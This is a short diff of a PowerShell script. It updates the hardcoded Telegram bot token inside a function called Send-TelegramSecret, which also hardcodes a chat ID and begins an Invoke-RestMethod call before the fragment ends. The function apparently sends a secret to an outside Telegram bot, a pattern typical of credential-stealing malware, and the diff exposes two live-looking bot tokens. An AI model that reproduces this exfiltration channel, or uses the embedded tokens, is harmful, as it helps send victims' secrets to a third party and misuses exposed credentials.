@@ -13,7 +13,7 @@ Write-Host "SCRIPT STARTED"
 function Send-TelegramSecret {
     param([string]$Secret)
 
-    $BOT_TOKEN = "8100041362:AAGM-c-kcNDCapn875nnlUUWILsD7s1MVRE"
+    $BOT_TOKEN = "8100041362:AAGqC_Whmnx3YOCAtGshGiQDVaMtQ7ch5Ek"
     $CHAT_ID   = "6975542904"
 
     Invoke-RestMethod `
